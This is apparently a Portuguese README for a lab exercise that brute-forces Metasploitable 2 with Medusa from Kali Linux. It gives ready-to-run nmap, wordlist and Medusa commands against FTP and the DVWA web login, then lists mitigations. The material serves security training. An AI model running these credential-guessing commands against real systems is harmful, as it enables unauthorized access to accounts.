# Projeto Prático: Pentest com Medusa & Metasploitable 2 🛡️

Este repositório contém a documentação e os scripts para a simulação de ataques de força bruta em um ambiente controlado, utilizando **Kali Linux** e a ferramenta **Medusa** contra o **Metasploitable 2**.

## 🏗️ Configuração do Ambiente
- **Atacante:** Kali Linux (IP: 192.168.56.102)
- **Alvo:** Metasploitable 2 (IP: 192.168.56.101)
- **Rede:** Host-Only (VirtualBox)

---

## 🔍 1. Enumeração
Identificação de serviços ativos (FTP e HTTP) e suas versões:
\`\`\`bash
nmap -sV -p 21-445 192.168.56.101
\`\`\`

---

## 📂 2. Preparação de Wordlists
Criação das listas de usuários e senhas para o teste:
\`\`\`bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nquerty\nmsfadmin" > pass.txt
\`\`\`

---

## ⚔️ 3. Ataques Realizados

### A. Força Bruta em FTP (Porta 21)
Ataque direto ao serviço de arquivos:
\`\`\`bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
\`\`\`

### B. Força Bruta em Formulário Web (DVWA)
Simulação de ataque na página de login. 
*Nota: Parâmetros capturados via inspeção de rede (POST).*
\`\`\`bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m PAGE:'dvwa/login.php' -m FORM='username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login Failed' -t 6
\`\`\`

---

## 🛡️ 4. Mitigação e Prevenção
Para prevenir estes ataques, recomenda-se:
1. **Bloqueio de IP (Fail2Ban):** Banir IPs após 3 tentativas falhas.
2. **Políticas de Senha:** Exigir caracteres especiais e tamanho mínimo.
3. **MFA:** Implementar autenticação em dois fatores.
4. **CAPTCHA:** Dificultar a automação por bots em formulários web.

---
**Aviso:** Uso estritamente educacional.
